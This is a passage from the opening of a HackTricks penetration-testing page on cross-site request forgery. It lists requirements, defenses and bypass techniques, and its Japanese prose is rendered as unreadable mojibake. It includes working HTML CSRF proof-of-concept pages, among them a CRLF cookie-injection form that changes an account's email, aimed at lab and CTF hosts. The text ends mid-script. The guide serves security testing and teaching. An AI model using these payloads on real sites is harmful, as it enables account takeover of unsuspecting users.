# CSRFï¼ˆã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼‰

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** HackTricksã§**ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofã‚’ãƒ•ã‚©ãƒ­ãƒ¼**](https://bit.ly/3xrrDrL) **ã—ã¦ã€web3ã®ãƒã‚°ã«ã¤ã„ã¦ã‚‚ã£ã¨å­¦ã³ã¾ã—ã‚‡ã†**

ğŸ web3ã®ãƒã‚°ãƒãƒ¥ãƒ¼ãƒˆãƒªã‚¢ãƒ«ã‚’èª­ã‚€

ğŸ”” æ–°ã—ã„ãƒã‚°å ±å¥¨é‡‘ã«ã¤ã„ã¦é€šçŸ¥ã‚’å—ã‘ã‚‹

ğŸ’¬ ã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ‡ã‚£ã‚¹ã‚«ãƒƒã‚·ãƒ§ãƒ³ã«å‚åŠ ã™ã‚‹

## CSRFã¨ã¯ï¼Ÿ

**ã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ•ã‚©ãƒ¼ã‚¸ã‚§ãƒªï¼ˆCross-site request forgeryã€CSRFï¼‰**ã¯ã€æ”»æ’ƒè€…ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã«æ„å›³ã—ãªã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒã§ãã‚‹ã‚¦ã‚§ãƒ–ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®è„†å¼±æ€§ã§ã™ã€‚\
ã“ã‚Œã¯ã€**ãƒ­ã‚°ã‚¤ãƒ³ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼**ãŒæ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã€ãã“ã‹ã‚‰æ‚ªæ„ã®ã‚ã‚‹JSã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ãŸã‚Šã€ãƒ•ã‚©ãƒ¼ãƒ ã‚’é€ä¿¡ã—ãŸã‚Šã€"ç”»åƒ"ã‚’**è¢«å®³è€…ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã«å–å¾—ã™ã‚‹ã“ã¨ã§è¡Œã‚ã‚Œã¾ã™ã€‚

### å¿…è¦æ¡ä»¶

CSRFã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã¯ã€ã¾ãš**æ‚ªç”¨ã™ã‚‹é‡è¦ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ï¼ˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚„ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã®å¤‰æ›´ã€è¢«å®³è€…ã‚’ã‚½ãƒ¼ã‚·ãƒ£ãƒ«ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã§ãƒ•ã‚©ãƒ­ãƒ¼ã•ã›ã‚‹ã€ã‚ˆã‚Šå¤šãã®ç‰¹æ¨©ã‚’ä¸ãˆã‚‹ãªã©ï¼‰ã€‚ã‚»ãƒƒã‚·ãƒ§ãƒ³ã¯**ã‚¯ãƒƒã‚­ãƒ¼ã¾ãŸã¯HTTPãƒ™ãƒ¼ã‚·ãƒƒã‚¯èªè¨¼ãƒ˜ãƒƒãƒ€ãƒ¼ã«ã®ã¿ä¾å­˜**ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ä»–ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã¯ã‚»ãƒƒã‚·ãƒ§ãƒ³ã®å‡¦ç†ã«ä½¿ç”¨ã§ãã¾ã›ã‚“ã€‚ãã—ã¦ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«**äºˆæ¸¬ä¸å¯èƒ½ãªãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**ãŒãªã„å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã‚’å›é¿ã™ã‚‹ãŸã‚ã«ã¯ã€ã„ãã¤ã‹ã®**å¯¾ç­–**ãŒå–ã‚‰ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚

### **ä¸€èˆ¬çš„ãªé˜²å¾¡ç­–**

* [**SameSiteã‚¯ãƒƒã‚­ãƒ¼**](hacking-with-cookies/#samesite)ï¼šã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚¯ãƒƒã‚­ãƒ¼ãŒã“ã®ãƒ•ãƒ©ã‚°ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€ä»»æ„ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã‹ã‚‰ã‚¯ãƒƒã‚­ãƒ¼ã‚’é€ä¿¡ã§ããªã„å ´åˆãŒã‚ã‚Šã¾ã™ã€‚
* [**ã‚¯ãƒ­ã‚¹ã‚ªãƒªã‚¸ãƒ³ãƒªã‚½ãƒ¼ã‚¹å…±æœ‰**](cors-bypass.md)ï¼šé–¢é€£ã™ã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«å®Ÿè¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚‹HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ç¨®é¡ã«å¿œã˜ã¦ã€è¢«å®³è€…ã‚µã‚¤ãƒˆã®**CORSãƒãƒªã‚·ãƒ¼**ã‚’è€ƒæ…®ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚_CORSãƒãƒªã‚·ãƒ¼ã¯ã€å˜ã«GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã¾ãŸã¯ãƒ•ã‚©ãƒ¼ãƒ ã‹ã‚‰ã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã€å¿œç­”ã‚’èª­ã¿å–ã‚‹å¿…è¦ãŒãªã„å ´åˆã«ã¯å½±éŸ¿ã—ã¾ã›ã‚“ã€‚_
* **ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¨±å¯ã™ã‚‹ã‚ˆã†ã«è¦æ±‚ã™ã‚‹ã€‚
* **ã‚­ãƒ£ãƒ—ãƒãƒ£**ã‚’è§£æ±ºã™ã‚‹
* **ãƒªãƒ•ã‚¡ãƒ©**ã¾ãŸã¯**ã‚ªãƒªã‚¸ãƒ³**ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’èª­ã¿å–ã‚‹ã€‚æ­£è¦è¡¨ç¾ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€æ¬¡ã®ã‚ˆã†ã«ãƒã‚¤ãƒ‘ã‚¹ã§ãã¾ã™ã€‚
* http://mal.net?orig=http://example.comï¼ˆURLã§çµ‚ã‚ã‚‹ï¼‰
* http://example.com.mal.netï¼ˆURLã§å§‹ã¾ã‚‹ï¼‰
* POSTã¾ãŸã¯GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã®**åå‰**ã‚’**å¤‰æ›´**ã™ã‚‹
* å„ã‚»ãƒƒã‚·ãƒ§ãƒ³ã§**CSRFãƒˆãƒ¼ã‚¯ãƒ³**ã‚’ä½¿ç”¨ã™ã‚‹ã€‚ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã€ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã§é€ä¿¡ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯CORSã§ä¿è­·ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### CSRFãƒãƒƒãƒ—

![](<../.gitbook/assets/image (112).png>)

## é˜²å¾¡å›é¿

### POSTã‹ã‚‰GETã¸

æ‚ªç”¨ã—ãŸã„ãƒ•ã‚©ãƒ¼ãƒ ãŒ**CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹æº–å‚™ãŒã§ãã¦ã„ã‚‹ã‹ã©ã†ã‹**ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ãŒã€**GET**ã‚‚**æœ‰åŠ¹**ã§ã‚ã‚Šã€GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã¨ãã«**CSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒå¼•ãç¶šãæ¤œè¨¼ã•ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹**ã‚’ç¢ºèªã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

### ãƒˆãƒ¼ã‚¯ãƒ³ã®æ¬ å¦‚

ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒˆãƒ¼ã‚¯ãƒ³ãŒå­˜åœ¨ã™ã‚‹å ´åˆã«æ­£ã—ã**ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¤œè¨¼**ã—ã¾ã™ãŒã€**ãƒˆãƒ¼ã‚¯ãƒ³ãŒçœç•¥ã•ã‚ŒãŸå ´åˆã«æ¤œè¨¼ã‚’ã‚¹ã‚­ãƒƒãƒ—**ã—ã¾ã™ã€‚\
ã“ã®çŠ¶æ³ã§ã¯ã€æ”»æ’ƒè€…ã¯ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å«ã‚€ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å…¨ä½“ã‚’ï¼ˆå€¤ã ã‘ã§ãªãï¼‰å‰Šé™¤ã—ã¦æ¤œè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã€CSRFæ”»æ’ƒã‚’å®Ÿè¡Œã§ãã¾ã™ã€‚

### CSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ãªã„

ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è¡Œã£ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¨åŒã˜ã‚»ãƒƒã‚·ãƒ§ãƒ³ã«ãƒˆãƒ¼ã‚¯ãƒ³ãŒå±ã—ã¦ã„ã‚‹ã“ã¨ã‚’**æ¤œè¨¼ã—ãªã„**å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ä»£ã‚ã‚Šã«ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ç™ºè¡Œã—ãŸãƒˆãƒ¼ã‚¯ãƒ³ã®ã‚°ãƒ­ãƒ¼ãƒãƒ«ãƒ—ãƒ¼ãƒ«ã‚’ç¶­æŒã—ã€ã“ã®ãƒ—ãƒ¼ãƒ«ã«è¡¨ç¤ºã•ã‚Œã‚‹ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å—ã‘å…¥ã‚Œã¾ã™ã€‚\
ã“ã®çŠ¶æ³ã§ã¯ã€æ”»æ’ƒè€…ã¯è‡ªåˆ†ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¦ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ãƒ­ã‚°ã‚¤ãƒ³ã—ã€**æœ‰åŠ¹ãªãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—**ã—ã€ãã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’CSRFæ”»æ’ƒã®è¢«å®³è€…ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«æä¾›ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒ¡ã‚½ãƒƒãƒ‰ãƒã‚¤ãƒ‘ã‚¹

ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒã€Œ**å¥‡å¦™ãª**ã€**ãƒ¡ã‚½ãƒƒãƒ‰**ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€**ãƒ¡ã‚½ãƒƒãƒ‰ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰æ©Ÿèƒ½**ãŒæ©Ÿèƒ½ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚\
ãŸã¨ãˆã°ã€**PUT**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€**POST**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦æ¬¡ã®ã‚ˆã†ã«é€ä¿¡ã§ãã¾ã™ï¼š_https://example.com/my/dear/api/val/num?**\_method=PUT**_

ã“ã‚Œã¯ã€**\_methodãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã«é€ä¿¡**ã™ã‚‹ã‹ã€**ãƒ˜ãƒƒãƒ€ãƒ¼**ã‚’ä½¿ç”¨ã—ã¦ã‚‚æ©Ÿèƒ½ã—ã¾ã™ã€‚

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_
### ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼ãƒˆãƒ¼ã‚¯ãƒ³ã®ãƒã‚¤ãƒ‘ã‚¹

ã‚‚ã—ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒ**CSRFä¿è­·æ‰‹æ³•**ã¨ã—ã¦**ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’å«ã‚€**ã‚«ã‚¹ã‚¿ãƒ ãƒ˜ãƒƒãƒ€ãƒ¼**ã‚’è¿½åŠ ã—ã¦ã„ã‚‹å ´åˆã¯ã€ä»¥ä¸‹ã®æ‰‹é †ã‚’è©¦ã—ã¦ã¿ã¦ãã ã•ã„ï¼š

* **ã‚«ã‚¹ã‚¿ãƒ ãƒˆãƒ¼ã‚¯ãƒ³ã¨ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å«ã¾ãªã„**çŠ¶æ…‹ã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã™ã€‚
* **åŒã˜é•·ã•**ã§ã™ãŒ**ç•°ãªã‚‹ãƒˆãƒ¼ã‚¯ãƒ³**ã‚’ä½¿ç”¨ã—ã¦ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒ†ã‚¹ãƒˆã—ã¾ã™ã€‚

### CSRFãƒˆãƒ¼ã‚¯ãƒ³ã¯ã‚¯ãƒƒã‚­ãƒ¼ã§æ¤œè¨¼ã•ã‚Œã¾ã™

å‰è¿°ã®è„†å¼±æ€§ã®ã•ã‚‰ãªã‚‹ãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ã¨ã—ã¦ã€ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã¯**ã‚¯ãƒƒã‚­ãƒ¼ã¨ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã®ä¸¡æ–¹ã«åŒã˜ãƒˆãƒ¼ã‚¯ãƒ³ãŒè¤‡è£½ã•ã‚Œã‚‹**ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã¯ã€**CSRFã‚¯ãƒƒã‚­ãƒ¼ã‚’è¨­å®šã—ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ã§é€ä¿¡ã•ã‚ŒãŸCSRFãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚¯ãƒƒã‚­ãƒ¼ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ã¨ä¸€è‡´ã™ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™**ã€‚

æ¬¡ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒæ¤œè¨¼ã•ã‚Œã‚‹éš›ã«ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯å˜ç´”ã«**ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã«é€ä¿¡ã•ã‚ŒãŸãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚¯ãƒƒã‚­ãƒ¼ã«ä¿å­˜ã•ã‚ŒãŸå€¤ã¨ä¸€è‡´ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèª**ã—ã¾ã™ã€‚\
ã“ã®çŠ¶æ³ã§ã¯ã€æ”»æ’ƒè€…ã¯å†ã³CSRFæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãŸã ã—ã€æ”»æ’ƒè€…ãŒè‡ªèº«ã®CSRFã‚¯ãƒƒã‚­ãƒ¼ã‚’CRLFã®ã‚ˆã†ã«è¢«å®³è€…ã«è¨­å®šã™ã‚‹ã“ã¨ã‚’è¨±ã™è„†å¼±æ€§ãŒã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã«å­˜åœ¨ã™ã‚‹å ´åˆã«é™ã‚Šã¾ã™ã€‚

ã“ã®å ´åˆã€å½ã®ç”»åƒã‚’èª­ã¿è¾¼ã‚€ã“ã¨ã‚’è©¦ã¿ã¦ã‚¯ãƒƒã‚­ãƒ¼ã‚’è¨­å®šã—ã€æ¬¡ã«ã“ã®ä¾‹ã®ã‚ˆã†ã«CSRFæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://ac4e1f591f895b02c0ee1ee3001800d4.web-security-academy.net/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>
```
{% hint style="info" %}
æ³¨æ„ã—ã¦ãã ã•ã„ã€‚**csrfãƒˆãƒ¼ã‚¯ãƒ³ãŒã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚¯ãƒƒã‚­ãƒ¼ã«é–¢é€£ã—ã¦ã„ã‚‹å ´åˆã€ã“ã®æ”»æ’ƒã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“**ã€‚ãªãœãªã‚‰ã€è¢«å®³è€…ã«è‡ªåˆ†ã®ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’è¨­å®šã™ã‚‹å¿…è¦ãŒã‚ã‚Šã€ã—ãŸãŒã£ã¦è‡ªåˆ†è‡ªèº«ã‚’æ”»æ’ƒã™ã‚‹ã“ã¨ã«ãªã‚‹ã‹ã‚‰ã§ã™ã€‚
{% endhint %}

### Content-Typeã®å¤‰æ›´

[**ã“ã¡ã‚‰**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests)ã«ã‚ˆã‚‹ã¨ã€**POST**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦**ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆã‚’å›é¿**ã™ã‚‹ãŸã‚ã«ã€æ¬¡ã®Content-Typeã®å€¤ãŒè¨±å¯ã•ã‚Œã¦ã„ã¾ã™ã€‚

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

ãŸã ã—ã€ä½¿ç”¨ã™ã‚‹**Content-Type**ã«ã‚ˆã£ã¦ã¯ã€**ã‚µãƒ¼ãƒãƒ¼ã®ãƒ­ã‚¸ãƒƒã‚¯ãŒç•°ãªã‚‹å ´åˆãŒã‚ã‚‹**ãŸã‚ã€ä¸Šè¨˜ã®å€¤ã‚„**`application/json`**ã€**`text/xml`**ã€**`application/xml`**ãªã©ã®ä»–ã®å€¤ã‚‚è©¦ã—ã¦ã¿ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

[ã“ã“](https://brycec.me/posts/corctf\_2021\_challenges)ã‹ã‚‰ã®JSONãƒ‡ãƒ¼ã‚¿ã‚’text/plainã¨ã—ã¦é€ä¿¡ã™ã‚‹ä¾‹:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### application/json preflight request bypass

æ—¢ã«ã”å­˜çŸ¥ã®é€šã‚Šã€HTMLãƒ•ã‚©ãƒ¼ãƒ ã‚’ä»‹ã—ã¦Content-TypeãŒ**`application/json`**ã®POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ã¾ãŸã€**`XMLHttpRequest`**ã‚’ä½¿ç”¨ã—ã¦è©¦ã¿ã‚‹ã¨ã€æœ€åˆã«**preflight**ãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚\
ãŸã ã—ã€ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãŒContent-Typeã«é–¢ä¿‚ãªããƒ‡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«ã€JSONãƒ‡ãƒ¼ã‚¿ã‚’content types **`text/plain`** ãŠã‚ˆã³ **`application/x-www-form-urlencoded`** ã‚’ä½¿ç”¨ã—ã¦é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
`Content-Type: text/plain` ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚©ãƒ¼ãƒ ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã‚µãƒ¼ãƒãƒ¼ãŒã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¿ã‚¤ãƒ— "application/json" ã®ã¿ã‚’å—ã‘å…¥ã‚Œã‚‹å ´åˆã€preflightãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã›ãšã«ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¿ã‚¤ãƒ— "text/plain; application/json" ã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãŸã€**SWFãƒ•ãƒ©ãƒƒã‚·ãƒ¥ãƒ•ã‚¡ã‚¤ãƒ«**ã‚’ä½¿ç”¨ã—ã¦ã“ã®åˆ¶é™ã‚’**ãƒã‚¤ãƒ‘ã‚¹**ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚è©³ç´°ã«ã¤ã„ã¦ã¯ã€[**ã“ã®æŠ•ç¨¿**](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### Referrer / Origin check bypass

**Refererãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å›é¿ã™ã‚‹**

ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«Refererãƒ˜ãƒƒãƒ€ãƒ¼ãŒå­˜åœ¨ã™ã‚‹å ´åˆã«ã®ã¿ã€ãã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’æ¤œè¨¼ã—ã¾ã™ãŒã€ãƒ˜ãƒƒãƒ€ãƒ¼ãŒçœç•¥ã•ã‚ŒãŸå ´åˆã¯æ¤œè¨¼ã‚’ã‚¹ã‚­ãƒƒãƒ—ã—ã¾ã™ã€‚
```markup
<meta name="referrer" content="never">
```
**æ­£è¦è¡¨ç¾ã®ãƒã‚¤ãƒ‘ã‚¹**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

ReferrerãŒãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å†…ã§é€ä¿¡ã™ã‚‹URLã®ã‚µãƒ¼ãƒãƒ¼ã®ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’è¨­å®šã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™ï¼š
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
